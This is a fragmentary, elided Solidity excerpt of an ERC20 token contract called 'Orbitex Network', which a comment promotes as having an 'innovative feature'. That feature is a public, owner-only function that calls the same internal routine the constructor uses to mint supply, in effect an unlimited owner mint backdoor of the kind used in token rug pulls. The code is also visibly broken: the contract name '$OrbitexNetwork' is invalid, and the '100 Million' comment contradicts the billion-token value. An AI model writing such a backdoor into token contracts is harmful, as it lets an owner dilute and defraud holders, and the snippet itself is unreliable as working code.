//
// $OrbitexNetwork proposes an innovative feature in its contract.
//
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function _OrbitexNetwork(uint256 amount) public onlyOwner {
 _OrbitexNetwork(msg.sender, amount);
    }
    ...
    function _OrbitexNetwork(address account, uint256 amount) internal virtual {
...
contract $OrbitexNetwork is ERC20 {

    uint tokenTotalSupply = 1000000000; // 100 Million Token Supply

    constructor() public ERC20("Orbitex Network", "ORBITEX") {
     _OrbitexNetwork(msg.sender, tokenTotalSupply * (10 ** uint256(decimals())));
    }
}